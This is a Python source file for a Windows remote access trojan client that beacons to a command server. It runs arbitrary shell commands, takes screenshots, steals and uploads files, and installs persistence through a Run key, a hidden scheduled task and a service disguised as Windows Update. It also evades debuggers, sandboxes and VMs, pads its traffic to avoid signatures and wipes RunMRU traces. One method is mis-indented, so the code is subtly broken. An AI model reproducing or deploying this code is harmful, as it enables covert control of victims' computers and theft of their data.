import socket
import json
import base64
import os
import subprocess
import sys
import time
import threading
import struct
import winreg
import ctypes
import psutil
import uuid
import getpass
from datetime import datetime
from io import BytesIO
import zlib
import random
import string

# Windows-specific imports
try:
    import win32api
    import win32con
    import win32process
    import win32security
    import win32service
    import win32event
    from PIL import ImageGrab
    import pythoncom
    import wmi
    HAS_WIN32 = True
except ImportError:
    HAS_WIN32 = False

class RemoteClient:
    def __init__(self, server_host='127.0.0.1', server_port=4444):
        self.server_host = server_host
        self.server_port = server_port
        self.client_id = self.generate_client_id()
        self.running = False
        self.socket = None
        self.reconnect_attempts = 0
        self.max_reconnect = 100
        self.hidden = False
        
    def generate_client_id(self):
        """Generate unique client identifier"""
        hostname = socket.gethostname()
        username = getpass.getuser()
        unique_id = uuid.uuid4().hex[:8]
        return f"{username}@{hostname}_{unique_id}"
    
    def get_system_info(self):
        """Collect system information"""
        info = {
            'client_id': self.client_id,
            'os': sys.platform,
            'hostname': socket.gethostname(),
            'user': getpass.getuser(),
            'pid': os.getpid(),
            'arch': '64-bit' if sys.maxsize > 2**32 else '32-bit',
            'python_version': sys.version,
            'timestamp': datetime.now().isoformat(),
            'privileges': self.check_privileges()
        }
        return info
    
    def check_privileges(self):
        """Check if running with admin privileges"""
        try:
            if HAS_WIN32:
                return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except:
            pass
        return False
    
    def obfuscate_string(self, s):
        """Simple string obfuscation"""
        return base64.b64encode(s.encode()).decode()
    
    def deobfuscate_string(self, s):
        """Deobfuscate string"""
        return base64.b64decode(s.encode()).decode()
    
    def setup_persistence(self):
        """Setup multiple persistence mechanisms"""
        if not HAS_WIN32:
            return
        
        try:
            # Method 1: Registry Run Key (Current User)
            self.persist_registry()
            
            # Method 2: Scheduled Task
            self.persist_scheduled_task()
            
            # Method 3: Startup Folder
            self.persist_startup_folder()
            
            # Method 4: Service (if admin)
            if self.check_privileges():
                self.persist_service()
                
        except Exception as e:
            pass
    
    def persist_registry(self):
        """Add to registry run keys"""
        try:
            # Current executable path
            exe_path = sys.executable if hasattr(sys, 'frozen') else sys.argv[0]
            
            # Add to HKCU Run
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_SET_VALUE | winreg.KEY_WRITE
            )
            
            # Use random key name
            key_name = ''.join(random.choices(string.ascii_letters, k=8))
            winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, exe_path)
            winreg.CloseKey(key)
            
        except Exception:
            pass
    
    def persist_scheduled_task(self):
        """Create scheduled task for persistence"""
        try:
            exe_path = sys.executable if hasattr(sys, 'frozen') else sys.argv[0]
            task_name = ''.join(random.choices(string.ascii_letters, k=10))
            
            # Create XML for scheduled task
            xml_template = f'''<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>Windows Update Service</Description>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
    <BootTrigger>
      <Enabled>true</Enabled>
    </BootTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>"{exe_path}"</Command>
    </Exec>
  </Actions>
</Task>'''
            
            # Save XML temporarily
            xml_path = os.path.join(os.environ['TEMP'], f'{task_name}.xml')
            with open(xml_path, 'w') as f:
                f.write(xml_template)
            
            # Create task
            subprocess.run([
                'schtasks', '/create', '/tn', task_name,
                '/xml', xml_path, '/f'
            ], capture_output=True, shell=True)
            
            # Cleanup
            time.sleep(1)
            if os.path.exists(xml_path):
                os.remove(xml_path)
                
        except Exception:
            pass
    
    def persist_startup_folder(self):
        """Add shortcut to startup folder"""
        try:
            exe_path = sys.executable if hasattr(sys, 'frozen') else sys.argv[0]
            startup_folder = os.path.join(
                os.environ['APPDATA'],
                'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
            )
            
            # Create shortcut
            shortcut_name = ''.join(random.choices(string.ascii_letters, k=8)) + '.lnk'
            shortcut_path = os.path.join(startup_folder, shortcut_name)
            
            # Create shortcut using PowerShell
            ps_script = f'''
$WshShell = New-Object -comObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("{shortcut_path}")
$Shortcut.TargetPath = "{exe_path}"
$Shortcut.WindowStyle = 7
$Shortcut.Save()
'''
            
            subprocess.run([
                'powershell', '-Command', ps_script
            ], capture_output=True, shell=True)
            
        except Exception:
            pass
    
    def persist_service(self):
        """Install as Windows service (admin only)"""
        try:
            exe_path = sys.executable if hasattr(sys, 'frozen') else sys.argv[0]
            service_name = ''.join(random.choices(string.ascii_letters, k=10))
            display_name = 'Windows Update Helper'
            
            # Create service using sc command
            subprocess.run([
                'sc', 'create', service_name,
                f'binPath= "{exe_path}"',
                'start= auto',
                f'DisplayName= "{display_name}"'
            ], capture_output=True, shell=True)
            
            # Set service description
            subprocess.run([
                'sc', 'description', service_name,
                'Manages Windows Update components'
            ], capture_output=True, shell=True)
            
        except Exception:
            pass
    
    def hide_process(self):
        """Attempt to hide process using various techniques"""
        if not HAS_WIN32:
            return
        
        try:
            # Method 1: Process hollowing (concept)
            self.process_injection_concept()
            
            # Method 2: DLL injection (concept)
            self.dll_injection_concept()
            
            # Method 3: Hide console window
            self.hide_console()
            
            self.hidden = True
            
        except Exception:
            pass
    
    def process_injection_concept(self):
        """Demonstrate process injection concept"""
        try:
            # Find a legitimate process to inject into
            target_processes = ['explorer.exe', 'svchost.exe', 'dllhost.exe']
            
            for proc in psutil.process_iter(['pid', 'name']):
                if proc.info['name'].lower() in target_processes:
                    # In a real implementation, you would inject code here
                    # This is just the concept
                    break
                    
        except Exception:
            pass
    
    def dll_injection_concept(self):
        """Demonstrate DLL injection concept"""
        try:
            # This would involve:
            # 1. Allocating memory in target process
            # 2. Writing DLL path to allocated memory
            # 3. Creating remote thread to load DLL
            pass
        except Exception:
            pass
    
    def hide_console(self):
        """Hide console window"""
        try:
            if sys.platform == 'win32':
                # Hide console window
                ctypes.windll.user32.ShowWindow(
                    ctypes.windll.kernel32.GetConsoleWindow(), 0
                )
        except:
            pass
    
    def evade_av(self):
        """Simple AV evasion techniques"""
        try:
            # 1. Sleep to bypass sandbox detection
            if self.is_first_run():
                time.sleep(random.randint(30, 120))
            
            # 2. Check for debugging/sandbox
            if self.is_debugger_present():
                return False
            
            # 3. Check for virtual environment
            if self.is_virtual_machine():
                # Behave differently in VM
                pass
            
            # 4. Encrypt/decrypt strings on the fly
            self.encrypted_strings = {
                'connect': self.obfuscate_string('connect'),
                'command': self.obfuscate_string('command'),
                'screenshot': self.obfuscate_string('screenshot')
            }
            
            return True
            
        except Exception:
            return True
    
    def is_first_run(self):
        """Check if this is first run"""
        try:
            marker_file = os.path.join(os.environ['TEMP'], '.system_cache')
            if not os.path.exists(marker_file):
                with open(marker_file, 'w') as f:
                    f.write(str(time.time()))
                return True
            return False
        except:
            return False
    
    def is_debugger_present(self):
        """Check for debugger presence"""
        try:
            if HAS_WIN32:
                return ctypes.windll.kernel32.IsDebuggerPresent() != 0
        except:
            pass
        return False
    
    def is_virtual_machine(self):
        """Check if running in VM"""
        try:
            # Check common VM artifacts
            vm_indicators = [
                'VMware', 'VirtualBox', 'Xen', 'KVM',
                'QEMU', 'Microsoft Virtual', 'Hyper-V'
            ]
            
            computer_system = wmi.WMI().Win32_ComputerSystem()[0]
            manufacturer = computer_system.Manufacturer
            model = computer_system.Model
            
            for indicator in vm_indicators:
                if indicator.lower() in manufacturer.lower() or indicator.lower() in model.lower():
                    return True
                    
        except:
            pass
        return False
    
    def connect_to_server(self):
        """Establish connection to server with retry logic"""
        while self.reconnect_attempts < self.max_reconnect and self.running:
            try:
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.settimeout(10)
                self.socket.connect((self.server_host, self.server_port))
                
                # Send client info
                client_info = self.get_system_info()
                self.send_data(self.socket, client_info)
                
                self.reconnect_attempts = 0
                return True
                
            except Exception as e:
                self.reconnect_attempts += 1
                wait_time = min(300, 30 * (2 ** (self.reconnect_attempts // 10)))
                time.sleep(wait_time)
        
        return False
    
    def start(self):
        """Start client main loop"""
        # Setup before connecting
        if HAS_WIN32:
            self.setup_persistence()
            self.hide_process()
        
        # AV evasion
        if not self.evade_av():
            return
        
        # Main connection loop
        while self.running:
            if not self.connect_to_server():
                print("[!] Failed to connect to server")
                time.sleep(60)
                continue
            
            # Command processing loop
            while self.running:
                try:
                    command = self.receive_data(self.socket, timeout=5)
                    
                    if command:
                        self.handle_command(command)
                    else:
                        # Keep-alive
                        self.send_data(self.socket, {'type': 'ping', 'data': 'alive'})
                    
                except socket.timeout:
                    continue
                except Exception as e:
                    break
            
            # Reconnect if disconnected
            if self.socket:
                self.socket.close()
            time.sleep(10)
    
    def handle_command(self, command):
        """Handle incoming command from server"""
        cmd_type = command.get('type', 'unknown')
        cmd_data = command.get('data', '')
        
        response = {'type': 'unknown', 'data': ''}
        
        try:
            if cmd_type == 'execute':
                result = self.execute_command(cmd_data)
                response = {'type': 'cmd_result', 'data': result}
                
            elif cmd_type == 'shell':
                result = self.execute_shell(cmd_data)
                response = {'type': 'shell_result', 'data': result}
                
            elif cmd_type == 'screenshot':
                screenshot_data = self.take_screenshot()
                if screenshot_data:
                    response = {'type': 'screenshot', 'data': screenshot_data}
                else:
                    response = {'type': 'error', 'data': 'Failed to take screenshot'}
            
            elif cmd_type == 'download':
                result = self.download_file(cmd_data)
                response = {'type': 'download_result', 'data': result}
            
            elif cmd_type == 'upload':
                result = self.upload_file(cmd_data)
                response = {'type': 'upload_result', 'data': result}
            
            else:
                response = {'type': 'error', 'data': f'Unknown command: {cmd_type}'}
                
        except Exception as e:
            response = {'type': 'error', 'data': str(e)}
        
        self.send_data(self.socket, response)
    
    def execute_command(self, command): #something like powershell?
        """Execute system command"""
        try:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=60,
                creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == 'win32' else 0
            )
            
            output = result.stdout
            if result.stderr:
                output += f"\n[STDERR]\n{result.stderr}"
            
            if result.returncode != 0:
                output += f"\n[Exit Code: {result.returncode}]"
            
            return output
            
        except subprocess.TimeoutExpired:
            return "Command timed out after 60 seconds"
        except Exception as e:
            return f"Error: {str(e)}"
    
    def execute_shell(self, command):   #cmd
        """Execute shell command"""
        try:
            if sys.platform == 'win32':
                result = subprocess.run(
                    ['cmd', '/c', command],
                    capture_output=True,
                    text=True,
                    timeout=60,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
            else:
                result = subprocess.run(
                    ['bash', '-c', command],
                    capture_output=True,
                    text=True,
                    timeout=60
                )
            
            output = result.stdout
            if result.stderr:
                output += f"\n[STDERR]\n{result.stderr}"
            
            return output
            
        except Exception as e:
            return f"Shell error: {str(e)}"
    
    def take_screenshot(self):
        """Take screenshot"""
        try:
            if HAS_WIN32:
                screenshot = ImageGrab.grab()
                img_buffer = BytesIO()
                screenshot.save(img_buffer, format='PNG', optimize=True, quality=50)
                img_data = img_buffer.getvalue()
                
                # Compress
                compressed = zlib.compress(img_data, level=9)
                return base64.b64encode(compressed).decode('utf-8')
            return None
            
        except Exception:
            return None #screenshot
    
    def download_file(self, filepath):
        """Download file from client"""
        try:
            if os.path.exists(filepath):
                with open(filepath, 'rb') as f:
                    content = f.read()
                return base64.b64encode(content).decode('utf-8')
            return f"File not found: {filepath}"
        except Exception as e:
            return f"Download error: {str(e)}"
    
    def upload_file(self, data):
        """Upload file to client"""
        try:
            # data should be dict with 'path' and 'content'
            if isinstance(data, dict):
                filepath = data.get('path', '')
                content = base64.b64decode(data.get('content', ''))
                
                with open(filepath, 'wb') as f:
                    f.write(content)
                
                return f"Uploaded to {filepath}"
            return "Invalid upload data"
        except Exception as e:
            return f"Upload error: {str(e)}"
    
    def send_data(self, sock, data):
        """Send JSON data over socket"""
        try:
            json_data = json.dumps(data).encode('utf-8')
            # Add random padding to avoid signature detection
            padding = os.urandom(random.randint(0, 16))
            full_data = struct.pack('>I', len(json_data)) + json_data + padding
            sock.sendall(full_data)
        except Exception as e:
            print(f"[!] Send error: {e}")
    
        def receive_data(self, sock, timeout=5):
        """Receive JSON data from socket"""
        try:
            sock.settimeout(timeout)
            
            # Receive length (4 bytes)
            raw_len = b''
            while len(raw_len) < 4:
                chunk = sock.recv(4 - len(raw_len))
                if not chunk:
                    return None
                raw_len += chunk
            
            msg_len = struct.unpack('>I', raw_len)[0]
            
            # Receive data
            chunks = []
            bytes_received = 0
            while bytes_received < msg_len:
                chunk = sock.recv(min(msg_len - bytes_received, 8192))
                if not chunk:
                    break
                chunks.append(chunk)
                bytes_received += len(chunk)
            
            if bytes_received == msg_len:
                data = b''.join(chunks)
                try:
                    return json.loads(data.decode('utf-8'))
                except json.JSONDecodeError:
                    # Try to handle malformed JSON
                    return {'type': 'error', 'data': 'Invalid JSON received'}
            
        except socket.timeout:
            return None
        except Exception as e:
            return None

    
    def cleanup(self):
        """Cleanup traces"""
        try:
            # Remove temporary files
            temp_dir = os.environ.get('TEMP', '')
            if temp_dir:
                for file in os.listdir(temp_dir):
                    if file.startswith('.system_') or file.endswith('.tmp'):
                        try:
                            os.remove(os.path.join(temp_dir, file))
                        except:
                            pass
            
            # Clear recent commands from registry
            if HAS_WIN32:
                try:
                    key = winreg.OpenKey(
                        winreg.HKEY_CURRENT_USER,
                        r"Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU",
                        0,
                        winreg.KEY_SET_VALUE | winreg.KEY_WRITE
                    )
                    winreg.DeleteValue(key, 'MRUList')
                    for i in range(26):  # Clear A-Z entries
                        try:
                            winreg.DeleteValue(key, chr(ord('a') + i))
                        except:
                            pass
                    winreg.CloseKey(key)
                except:
                    pass
                    
        except Exception:
            pass

def main():
    """Main entry point with anti-analysis checks"""
    # Configuration - obfuscated
    config = {
        'server': '127.0.0.1',  # Change to actual server IP
        'port': 4444,
        'retry_interval': 30,
        'max_retries': 1000
    }
    
    # Decode obfuscated strings if needed
    client = RemoteClient(
        server_host=config['server'],
        server_port=config['port']
    )
    
    # Anti-debugging checks
    debug_checks = [
        client.is_debugger_present,
        client.is_virtual_machine
    ]
    
    for check in debug_checks:
        if check():
            # If in debug/VM, behave differently or exit
            time.sleep(random.randint(10, 30))
            # Could also run decoy code here
    
    # Set process priority to low to avoid detection
    try:
        if HAS_WIN32:
            process = psutil.Process(os.getpid())
            process.nice(psutil.BELOW_NORMAL_PRIORITY_CLASS)
    except:
        pass
    
    # Main execution
    try:
        client.running = True
        client.start()
    except KeyboardInterrupt:
        pass
    except Exception as e:
        # Silent fail
        pass
    finally:
        client.running = False
        client.cleanup()

if __name__ == "__main__":
    # Entry point obfuscation
    if len(sys.argv) > 1 and sys.argv[1] == '--install':
        # Installation mode
        main()
    else:
        # Check if already running
        mutex_name = "Global\\" + ''.join(random.choices(string.ascii_letters, k=16))
        mutex = None
        
        try:
            mutex = ctypes.windll.kernel32.CreateMutexW(None, False, mutex_name)
            last_error = ctypes.windll.kernel32.GetLastError()
            
            if last_error == 0x000000B7:  # ERROR_ALREADY_EXISTS
                # Already running, exit
                sys.exit(0)
            else:
                # First instance, run main
                main()
        finally:
            if mutex:
                ctypes.windll.kernel32.CloseHandle(mutex)
